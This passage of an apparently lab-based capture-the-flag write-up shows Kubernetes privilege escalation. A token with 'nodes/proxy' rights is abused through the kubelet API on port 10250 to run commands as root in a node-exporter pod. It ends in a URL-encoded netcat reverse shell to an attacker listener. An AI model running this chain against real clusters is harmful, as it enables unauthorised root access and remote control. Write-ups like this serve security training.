mcp@mcp-server-54464cb475-29ztf:~$ curl -X POST -ks https://10.43.0.1:443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" --data '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}' | python3 -m json.tool
{
    "kind": "SelfSubjectRulesReview",
    "apiVersion": "authorization.k8s.io/v1",
    "metadata": {},
    "spec": {},
    "status": {
        "resourceRules": [
            {
                "verbs": [
                    "create"
                ],
                "apiGroups": [
                    "authorization.k8s.io"
                ],
                "resources": [
                    "selfsubjectaccessreviews",
                    "selfsubjectrulesreviews"
                ]
            },
            {
                "verbs": [
                    "create"
                ],
                "apiGroups": [
                    "authentication.k8s.io"
                ],
                "resources": [
                    "selfsubjectreviews"
                ]
            },
            {
                "verbs": [
                    "get"
                ],
                "apiGroups": [
                    ""
                ],
                "resources": [
                    "nodes/proxy"
                ]
            }
```

As seen here i have the `nodes/proxy` resource set, this can be abused to get code execution as root

```python
curl -sk https://10.129.244.214:10250/pods -H "Authorization: Bearer $TOKEN" | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name) -> \([.spec.containers[].name])"'

monitoring/prometheus-server-867bb4fcfd-m4t59 -> ["prometheus-server-configmap-reload","prometheus-server"]
monitoring/prometheus-kube-state-metrics-7c8c787854-25j6q -> ["kube-state-metrics"]
default/mcp-server-54464cb475-29ztf -> ["mcp-server"]
monitoring/prometheus-prometheus-node-exporter-nmntq -> ["node-exporter"]
kube-system/coredns-76c974cb66-cn7l6 -> ["coredns"]
kube-system/local-path-provisioner-8686667995-lp9th -> ["local-path-provisioner"]
kube-system/metrics-server-c8774f4f4-phw6q -> ["metrics-server"]
```

I then query the pods to find a suitable one i can use for RCE on the SSH session since thats the host with the port `10250` running

```python
nightfall@fireflow:~$ websocat --insecure --header "Authorization: Bearer $TOKEN" --protocol v4.channel.k8s.io "wss://10.129.244.214:10250/exec/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter?output=1&error=1&command=/bin/sh&command=-c&command=id"

uid=0(root) gid=65534(nobody) groups=10(wheel),65534(nobody)
{"metadata":{},"status":"Success"}


websocat: WebSocketError: I/O failure
websocat: error running
```

I now have code execution as root!

```python
penelope -p 1338
```

Ill start a listener

```python
websocat --insecure --header "Authorization: Bearer $TOKEN" --protocol v4.channel.k8s.io "wss://10.129.244.214:10250/exec/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter?output=1&error=1&command=/bin/sh&command=-c&command=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.61%201338%20%3E%2Ftmp%2Ff"
```

Ill then just use a URL encoded netcat reverse shell, to get a reverse shell as root

```python
penelope -p 1338
[+] Listening for reverse shells on 0.0.0.0:1338 -> 127.0.0.1 • 192.168.86.128 • 10.10.14.61
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => fireflow 10.129.244.214 Linux-x86_64 👤 root(0) 😍️ Session ID <1>
[+] Upgrading shell to PTY...
[!] Python agent cannot be deployed. I need to maintain at least one Raw session to handle the PTY
[+] Attempting to spawn a reverse shell on 10.10.14.61:1338
[+] [New Reverse Shell] => fireflow 10.129.244.214 Linux-x86_64 👤 root(0) 😍️ Session ID <2>
[+] PTY upgrade successful via /bin/script
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
[+] Session log: /home/kali/.penelope/sessions/fireflow~10.129.244.214-Linux-x86_64/2026_08_24-19_41_12-297.log
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
/ # whoami
root
/ # 
```

I now have a root shell!

![Screenshot](images/fireflow/pasted-image-20260824194421.webp)

I can now grab the root flag
